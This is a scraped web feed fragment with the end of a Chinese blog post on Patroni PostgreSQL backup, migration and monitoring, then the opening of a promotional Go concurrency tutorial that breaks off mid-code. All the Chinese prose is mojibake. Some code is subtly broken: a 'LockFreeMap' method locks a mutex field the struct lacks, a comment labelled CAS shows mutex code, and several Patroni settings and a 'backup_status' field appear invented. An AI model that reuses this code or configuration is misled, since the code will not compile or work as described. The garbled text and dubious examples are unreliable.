<p><img src="https://gitee.com/morelikeyueyue/picgo-picture/raw/master/images-pan/patroni%E5%A4%87%E4%BB%BD-1.svg" alt="patroni å¤‡ä»½-1" loading="lazy"/></p>
<h4 data-id="heading-7">1.3 è‡ªå®šä¹‰å¤‡ä»½è§£å†³æ–¹æ¡ˆ</h4>
<p>é™¤äº†å†…ç½®çš„å¤‡ä»½æ–¹æ³•ï¼ŒPatroni è¿˜æ”¯æŒå®Œå…¨è‡ªå®šä¹‰çš„å¤‡ä»½æ¢å¤è„šæœ¬ï¼š</p>
<h5 data-id="heading-8">1.3.1 è‡ªå®šä¹‰ bootstrap è„šæœ¬</h5>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">bootstrap:</span>
  <span class="hljs-attr">method:</span> <span class="hljs-string">custom_init</span>
  <span class="hljs-attr">custom_init:</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">/usr/local/bin/custom_bootstrap.sh</span>
    <span class="hljs-attr">recovery_conf:</span>
      <span class="hljs-attr">recovery_target_action:</span> <span class="hljs-string">promote</span>
      <span class="hljs-attr">recovery_target_timeline:</span> <span class="hljs-string">latest</span>
      <span class="hljs-attr">restore_command:</span> <span class="hljs-string">envdir</span> <span class="hljs-string">/etc/wal-e.d/env</span> <span class="hljs-string">wal-e</span> <span class="hljs-string">wal-fetch</span> <span class="hljs-string">"%f"</span> <span class="hljs-string">"%p"</span>
</code></pre>
<h5 data-id="heading-9">1.3.2 è‡ªå®šä¹‰å‰¯æœ¬åˆ›å»ºæ–¹æ³•</h5>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">postgresql:</span>
  <span class="hljs-attr">create_replica_methods:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">custom_restore</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">basebackup</span>
  <span class="hljs-attr">custom_restore:</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">/usr/local/bin/custom_restore.py</span>
    <span class="hljs-attr">keep_data:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">no_params:</span> <span class="hljs-literal">false</span>
    <span class="hljs-attr">backup_source:</span> <span class="hljs-string">s3://my-bucket/backups/</span>
</code></pre>
<h3 data-id="heading-10">2. æ•°æ®è¿ç§»</h3>
<h4 data-id="heading-11">2.1 ä¸»è¦ç‰ˆæœ¬å‡çº§</h4>
<p>PostgreSQL ä¸»è¦ç‰ˆæœ¬å‡çº§éœ€è¦ç‰¹æ®Šçš„æ•°æ®è¿ç§»æµç¨‹ï¼š</p>
<p><img src="https://gitee.com/morelikeyueyue/picgo-picture/raw/master/images-pan/patroni%E5%A4%87%E4%BB%BD-2.svg" alt="patroni å¤‡ä»½-2" loading="lazy"/></p>
<p>å‡çº§æ­¥éª¤ï¼š</p>
<ol>
<li>åœæ­¢ Patroni æœåŠ¡ã€‚</li>
<li>å‡çº§ PostgreSQL äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</li>
<li>æ‰§è¡Œ pg_upgrade è¿›è¡Œæ•°æ®è¿ç§»ã€‚</li>
<li>æ¸…é™¤ DCS ä¸­çš„é›†ç¾¤çŠ¶æ€ã€‚</li>
<li>å¯åŠ¨ Patroni å¹¶é‡æ–°åˆå§‹åŒ–é›†ç¾¤ã€‚</li>
</ol>
<h4 data-id="heading-12">2.2 è·¨é›†ç¾¤æ•°æ®è¿ç§»</h4>
<p>å¯¹äºè·¨é›†ç¾¤çš„æ•°æ®è¿ç§»ï¼Œå¯ä»¥ä½¿ç”¨é€»è¾‘å¤åˆ¶æˆ–ç‰©ç†å¤‡ä»½æ¢å¤ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># æºé›†ç¾¤é…ç½®</span>
<span class="hljs-attr">bootstrap:</span>
  <span class="hljs-attr">method:</span> <span class="hljs-string">logical_backup</span>
  <span class="hljs-attr">logical_backup:</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">/usr/local/bin/logical_backup.sh</span>
    <span class="hljs-attr">format:</span> <span class="hljs-string">directory</span>
    <span class="hljs-attr">compression:</span> <span class="hljs-string">gzip</span>
<span class="hljs-string">â€‹</span>
<span class="hljs-comment"># ç›®æ ‡é›†ç¾¤é…ç½®</span>
<span class="hljs-attr">postgresql:</span>
  <span class="hljs-attr">create_replica_methods:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">logical_restore</span>
  <span class="hljs-attr">logical_restore:</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">/usr/local/bin/logical_restore.sh</span>
    <span class="hljs-attr">source_cluster:</span> <span class="hljs-string">original-cluster</span>
    <span class="hljs-attr">parallel_jobs:</span> <span class="hljs-number">4</span>
</code></pre>
<h3 data-id="heading-13">3. ç›‘æ§ä¸éªŒè¯</h3>
<p>ä¸ºç¡®ä¿å¤‡ä»½æ¢å¤çš„æœ‰æ•ˆæ€§ï¼Œéœ€è¦å»ºç«‹å®Œå–„çš„ç›‘æ§ä½“ç³»ï¼š</p>
<p><strong>å…³é”®ç›‘æ§æŒ‡æ ‡ï¼š</strong></p>
<ul>
<li>å¤‡ä»½æˆåŠŸç‡ä¸è€—æ—¶</li>
<li>æ¢å¤æ—¶é—´ç›®æ ‡ï¼ˆRTOï¼‰è¾¾æˆæƒ…å†µ</li>
<li>æ•°æ®æ¢å¤ç‚¹ç›®æ ‡ï¼ˆRPOï¼‰ç¬¦åˆåº¦</li>
<li>WAL å½’æ¡£å»¶è¿Ÿ</li>
<li>å­˜å‚¨ç©ºé—´ä½¿ç”¨æƒ…å†µ</li>
</ul>
<p>éªŒè¯è„šæœ¬ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># å¤‡ä»½éªŒè¯è„šæœ¬</span>
BACKUP_STATUS=$(patronictl list --format json | jq <span class="hljs-string">'.backup_status'</span>)
<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$BACKUP_STATUS</span>"</span> != <span class="hljs-string">"healthy"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"å¤‡ä»½çŠ¶æ€å¼‚å¸¸: <span class="hljs-variable">$BACKUP_STATUS</span>"</span>
    <span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>
 
<span class="hljs-comment"># æ£€æŸ¥æœ€æ–°çš„å¤‡ä»½æ—¶é—´</span>
LAST_BACKUP=$(wal-e backup-list --detail LATEST | grep last_modified)
<span class="hljs-keyword">if</span> [ -z <span class="hljs-string">"<span class="hljs-variable">$LAST_BACKUP</span>"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"æœªæ‰¾åˆ°æœ‰æ•ˆå¤‡ä»½"</span>
    <span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>
 
<span class="hljs-built_in">echo</span> <span class="hljs-string">"å¤‡ä»½éªŒè¯é€šè¿‡: <span class="hljs-variable">$LAST_BACKUP</span>"</span>
</code></pre>
<h3 data-id="heading-14">4. æ•…éšœå¤„ç†ä¸æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-15">4.1 å¸¸è§é—®é¢˜å¤„ç†ï¼š</h4>
<ol>
<li>WAL-E æ¢å¤å¤±è´¥
<ul>
<li>æ£€æŸ¥äº‘å­˜å‚¨æƒé™å’Œç½‘ç»œè¿æ¥</li>
<li>éªŒè¯ç¯å¢ƒå˜é‡é…ç½®</li>
<li>æ£€æŸ¥å¤‡ä»½æ–‡ä»¶å®Œæ•´æ€§</li>
</ul>
</li>
<li>pg_basebackup è¶…æ—¶
<ul>
<li>è°ƒæ•´ max-rate å‚æ•°é™åˆ¶å¸¦å®½</li>
<li>æ£€æŸ¥ç½‘ç»œå¸¦å®½å’Œå»¶è¿Ÿ</li>
<li>å¢åŠ è¶…æ—¶æ—¶é—´é…ç½®</li>
</ul>
</li>
<li>ç‰ˆæœ¬å…¼å®¹æ€§é—®é¢˜
<ul>
<li>ç¡®ä¿å¤‡ä»½æ¢å¤å·¥å…·ç‰ˆæœ¬åŒ¹é…</li>
<li>éªŒè¯ PostgreSQL ç‰ˆæœ¬å…¼å®¹æ€§</li>
<li>æµ‹è¯•è¿ç§»æµç¨‹ before ç”Ÿäº§ç¯å¢ƒ</li>
</ul>
</li>
</ol>
<h4 data-id="heading-16">4.2 æœ€ä½³å®è·µ</h4>
<ol>
<li>å¤šå¤‡ä»½ç­–ç•¥ï¼šç»“åˆ WAL-E äº‘å¤‡ä»½å’Œæœ¬åœ° pg_basebackupã€‚</li>
<li>å®šæœŸéªŒè¯ï¼šå®šæœŸæµ‹è¯•å¤‡ä»½æ¢å¤æµç¨‹ã€‚</li>
<li>ç›‘æ§å‘Šè­¦ï¼šè®¾ç½®å¤‡ä»½å¤±è´¥å³æ—¶å‘Šè­¦ã€‚</li>
<li>æ–‡æ¡£å®Œå–„ï¼šè¯¦ç»†è®°å½•å¤‡ä»½æ¢å¤ proceduresã€‚</li>
<li>è‡ªåŠ¨åŒ–æµ‹è¯•ï¼šå»ºç«‹è‡ªåŠ¨åŒ–çš„å¤‡ä»½æ¢å¤æµ‹è¯•æµæ°´çº¿ã€‚</li>
</ol>
<p>é€šè¿‡åˆç†çš„å¤‡ä»½æ¢å¤ç­–ç•¥å’Œä¸¥æ ¼çš„æ“ä½œæµç¨‹ï¼Œå¯ä»¥ç¡®ä¿ Patroni é›†ç¾¤åœ¨å„ç±»æ•…éšœåœºæ™¯ä¸‹éƒ½èƒ½å¿«é€Ÿæ¢å¤æœåŠ¡ï¼Œä¿éšœä¸šåŠ¡è¿ç»­æ€§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GoæŠ€æœ¯ä¸“å®¶è¿›é˜¶è¥ ä»ä»£ç å¼€å‘åˆ°æ¶æ„è®¾è®¡ï¼Œå¼€å¯GoæŠ€æœ¯ä¸“å®¶ä¹‹è·¯]]></title>    <link>https://juejin.cn/post/7588971908227104802</link>    <guid>https://juejin.cn/post/7588971908227104802</guid>    <pubDate>2025-12-29T06:50:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588971908227104802" data-draft-id="7588844115318390836" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GoæŠ€æœ¯ä¸“å®¶è¿›é˜¶è¥ ä»ä»£ç å¼€å‘åˆ°æ¶æ„è®¾è®¡ï¼Œå¼€å¯GoæŠ€æœ¯ä¸“å®¶ä¹‹è·¯"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-29T06:50:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·859968167769"/> <meta itemprop="url" content="https://juejin.cn/user/2086203644184827"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GoæŠ€æœ¯ä¸“å®¶è¿›é˜¶è¥ ä»ä»£ç å¼€å‘åˆ°æ¶æ„è®¾è®¡ï¼Œå¼€å¯GoæŠ€æœ¯ä¸“å®¶ä¹‹è·¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2086203644184827/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·859968167769
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T06:50:43.000Z" title="Mon Dec 29 2025 06:50:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=http%3A%2F%2Fxingkeit.top%2F15564%2F" target="_blank" title="http://xingkeit.top/15564/" ref="nofollow noopener noreferrer">GoæŠ€æœ¯ä¸“å®¶è¿›é˜¶è¥ ä»ä»£ç å¼€å‘åˆ°æ¶æ„è®¾è®¡ï¼Œå¼€å¯GoæŠ€æœ¯ä¸“å®¶ä¹‹è·¯</a></p>
<h2 data-id="heading-0">å‰è¨€ï¼šGoè¯­è¨€é«˜å¹¶å‘çš„æ ¸å¿ƒä¼˜åŠ¿</h2>
<p>Goè¯­è¨€å‡­å€Ÿå…¶è½»é‡çº§goroutineå’Œé«˜æ•ˆçš„è°ƒåº¦å™¨ï¼Œæˆä¸ºæ„å»ºé«˜å¹¶å‘ç³»ç»Ÿçš„é¦–é€‰è¯­è¨€ä¹‹ä¸€ã€‚é€šè¿‡Goè¿›é˜¶è¥çš„ç³»ç»Ÿå­¦ä¹ ï¼Œæˆ‘æ€»ç»“äº†ä»¥ä¸‹é«˜å¹¶å‘ç¼–ç¨‹çš„æ ¸å¿ƒæŠ€å·§å’Œæ€§èƒ½ä¼˜åŒ–æ–¹æ³•ï¼Œè¿™äº›å®æˆ˜ç»éªŒå¸®åŠ©æˆ‘å°†æœåŠ¡çš„QPSä»æœ€åˆçš„500æå‡åˆ°äº†15000+ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€Goroutineé«˜æ•ˆä½¿ç”¨æ¨¡å¼</h2>
<h3 data-id="heading-2">1. åˆç†çš„Goroutineç”Ÿå‘½å‘¨æœŸç®¡ç†</h3>
<p>Go</p>
<p><em>î¦Œ</em></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// åä¾‹ï¼šæ— é™åˆ¶åˆ›å»ºgoroutineå¯èƒ½å¯¼è‡´æ³„éœ²</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">processTasks</span><span class="hljs-params">(tasks []Task)</span></span> {
    <span class="hljs-keyword">for</span> _, task := <span class="hljs-keyword">range</span> tasks {
        <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t Task)</span></span> {
            <span class="hljs-comment">// å¤„ç†ä»»åŠ¡</span>
        }(task)
    }
}

<span class="hljs-comment">// æ­£ä¾‹ï¼šä½¿ç”¨sync.WaitGroupæ§åˆ¶å¹¶å‘</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">processTasksSafely</span><span class="hljs-params">(tasks []Task)</span></span> {
    <span class="hljs-keyword">var</span> wg sync.WaitGroup
    <span class="hljs-keyword">for</span> _, task := <span class="hljs-keyword">range</span> tasks {
        wg.Add(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t Task)</span></span> {
            <span class="hljs-keyword">defer</span> wg.Done()
            <span class="hljs-comment">// å¤„ç†ä»»åŠ¡</span>
        }(task)
    }
    wg.Wait()
}

<span class="hljs-comment">// è¿›é˜¶ï¼šå¸¦ç¼“å†²åŒºçš„workeræ± æ¨¡å¼</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">workerPool</span><span class="hljs-params">(tasks []Task, workerNum <span class="hljs-type">int</span>)</span></span> {
    taskCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> Task, <span class="hljs-number">100</span>)
    <span class="hljs-keyword">var</span> wg sync.WaitGroup
    
    <span class="hljs-comment">// å¯åŠ¨worker</span>
    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; workerNum; i++ {
        wg.Add(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
            <span class="hljs-keyword">defer</span> wg.Done()
            <span class="hljs-keyword">for</span> task := <span class="hljs-keyword">range</span> taskCh {
                processTask(task)
            }
        }()
    }
    
    <span class="hljs-comment">// åˆ†å‘ä»»åŠ¡</span>
    <span class="hljs-keyword">for</span> _, task := <span class="hljs-keyword">range</span> tasks {
        taskCh &lt;- task
    }
    <span class="hljs-built_in">close</span>(taskCh)
    wg.Wait()
}
</code></pre>
<h3 data-id="heading-3">2. Goroutineæ³„æ¼æ£€æµ‹æŠ€å·§</h3>
<p>Go</p>
<p><em>î¦Œ</em></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// åœ¨main.goä¸­æ³¨å…¥goleakæ£€æµ‹</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">"go.uber.org/goleak"</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestMain</span><span class="hljs-params">(m *testing.M)</span></span> {
    goleak.VerifyTestMain(m)
}

<span class="hljs-comment">// ä¸šåŠ¡ä»£ç ä¸­æ£€æŸ¥goroutineæ•°é‡</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">monitorGoroutines</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">for</span> {
            num := runtime.NumGoroutine()
            <span class="hljs-keyword">if</span> num &gt; <span class="hljs-number">1000</span> { <span class="hljs-comment">// é˜ˆå€¼è­¦å‘Š</span>
                log.Printf(<span class="hljs-string">"WARNING: high goroutine count: %d"</span>, num)
                <span class="hljs-comment">// å¯ä»¥dumpå½“å‰å †æ ˆ</span>
                buf := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">20</span>)
                stacklen := runtime.Stack(buf, <span class="hljs-literal">true</span>)
                log.Printf(<span class="hljs-string">"=== received SIGQUIT ===\n*** goroutine dump...\n%s\n*** end"</span>, buf[:stacklen])
            }
            time.Sleep(<span class="hljs-number">5</span> * time.Second)
        }
    }()
}
</code></pre>
<h2 data-id="heading-4">äºŒã€é«˜æ€§èƒ½å¹¶å‘åŸè¯­å®æˆ˜</h2>
<h3 data-id="heading-5">1. sync.Poolå¯¹è±¡æ± ä¼˜åŒ–</h3>
<p>Go</p>
<p><em>î¦Œ</em></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// ååºåˆ—åŒ–åœºæ™¯ä¸­çš„Poolä½¿ç”¨</span>
<span class="hljs-keyword">var</span> jsonPool = sync.Pool{
    New: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-keyword">interface</span>{} {
        <span class="hljs-keyword">return</span> &amp;json.Decoder{}
    },
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">decodeWithPool</span><span class="hljs-params">(data []<span class="hljs-type">byte</span>, v <span class="hljs-keyword">interface</span>{})</span></span> <span class="hljs-type">error</span> {
    decoder := jsonPool.Get().(*json.Decoder)
    <span class="hljs-keyword">defer</span> jsonPool.Put(decoder)
    
    decoder.Reset(bytes.NewReader(data))
    <span class="hljs-keyword">return</span> decoder.Decode(v)
}

<span class="hljs-comment">// Bufferæ± ä¼˜åŒ–ç¤ºä¾‹</span>
<span class="hljs-keyword">var</span> bufPool = sync.Pool{
    New: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-keyword">interface</span>{} {
        <span class="hljs-keyword">return</span> bytes.NewBuffer(<span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>))
    },
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">processRequest</span><span class="hljs-params">(data []<span class="hljs-type">byte</span>)</span></span> {
    buf := bufPool.Get().(*bytes.Buffer)
    <span class="hljs-keyword">defer</span> bufPool.Put(buf)
    buf.Reset()
    
    <span class="hljs-comment">// ä½¿ç”¨bufå¤„ç†æ•°æ®...</span>
}
</code></pre>
<h3 data-id="heading-6">2. åŸå­æ“ä½œæ›¿ä»£é”</h3>
<p>Go</p>
<p><em>î¦Œ</em></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// è®¡æ•°å™¨åœºæ™¯çš„ä¼˜åŒ–å¯¹æ¯”</span>
<span class="hljs-keyword">type</span> Counter <span class="hljs-keyword">struct</span> {
    mu    sync.Mutex
    count <span class="hljs-type">int64</span>
}

<span class="hljs-comment">// ä¼ ç»Ÿäº’æ–¥é”æ–¹å¼</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Counter)</span></span> Inc() {
    c.mu.Lock()
    c.count++
    c.mu.Unlock()
}

<span class="hljs-comment">// åŸå­æ“ä½œä¼˜åŒ–ç‰ˆ</span>
<span class="hljs-keyword">type</span> AtomicCounter <span class="hljs-keyword">struct</span> {
    count <span class="hljs-type">int64</span>
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *AtomicCounter)</span></span> Inc() {
    atomic.AddInt64(&amp;c.count, <span class="hljs-number">1</span>)
}

<span class="hljs-comment">// æ›´å¤æ‚çš„CASæ“ä½œç¤ºä¾‹</span>
<span class="hljs-keyword">type</span> SafeMap <span class="hljs-keyword">struct</span> {
    m  <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>{}
    mu sync.RWMutex
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *SafeMap)</span></span> Update(key <span class="hljs-type">string</span>, updater <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(<span class="hljs-keyword">interface</span>{})</span></span> <span class="hljs-keyword">interface</span>{}) {
    s.mu.Lock()
    <span class="hljs-keyword">defer</span> s.mu.Unlock()
    old := s.m[key]
    s.m[key] = updater(old)
}

<span class="hljs-comment">// ä½¿ç”¨atomic.Valueçš„æ— é”è¯»å–ä¼˜åŒ–</span>
<span class="hljs-keyword">type</span> LockFreeMap <span class="hljs-keyword">struct</span> {
    v atomic.Value <span class="hljs-comment">// map[string]interface{}</span>
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m *LockFreeMap)</span></span> Get(key <span class="hljs-type">string</span>) <span class="hljs-keyword">interface</span>{} {
    <span class="hljs-keyword">return</span> m.v.Load().(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>{})[key]
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m *LockFreeMap)</span></span> Update(key <span class="hljs-type">string</span>, value <span class="hljs-keyword">interface</span>{}) {
    m.mu.Lock()
    <span class="hljs-keyword">defer</span> m.mu.Unlock()
    old := m.v.Load().(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>{})
    <span class="hljs-built_in">new</span> := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>{})
    <span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> old {
        <span class="hljs-built_in">new</span>[k] = v
    }
    <span class="hljs-built_in">new</span>[key] = value
    m.v.Store(<span class="hljs-built_in">new</span>)
}
</code></pre>
<h2 data-id="heading-7">ä¸‰ã€å¹¶å‘æ¨¡å¼è¿›é˜¶å®è·µ</h2>
<h3 data-id="heading-8">1. Pipelineæ¨¡å¼ä¼˜åŒ–</h3>
<p>Go</p>
<p><em>î¦Œ</em></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// ä¸‰é˜¶æ®µç®¡é“å¤„ç†ç¤ºä¾‹</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">processPipeline</span><span class="hljs-params">(input &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)</span></span> &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span> {
    <span class="hljs-comment">// ç¬¬ä¸€é˜¶æ®µï¼šå¹³æ–¹è®¡ç®—</span>
